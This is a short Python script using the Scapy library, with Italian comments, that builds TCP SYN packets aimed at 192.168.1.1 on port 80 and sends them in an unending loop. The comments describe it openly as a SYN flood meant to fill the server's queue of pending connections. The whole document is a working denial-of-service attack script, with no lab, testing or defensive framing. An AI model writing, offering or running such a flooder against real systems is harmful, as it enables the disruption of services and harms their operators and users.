from scapy.all import IP, TCP, send 

# Configurazione del Pacchetto: Configura l'indirizzo IP di destinazione e il pacchetto TCP. Per un attacco SYN flood, imposta il flag SYN: 
ip = IP(dst="192.168.1.1") 
tcp = TCP(dport=80, flags='S')
packet=ip/tcp

# Invio del Pacchetto: Per un attacco di SYN flood, devo inondare e quindi inviare molti di questi pacchetti per saturare la coda di connessioni in attesa del server:

send(packet, loop=1, inter=0.01) # Invio pacchetti in loop ogni 0.01 secondi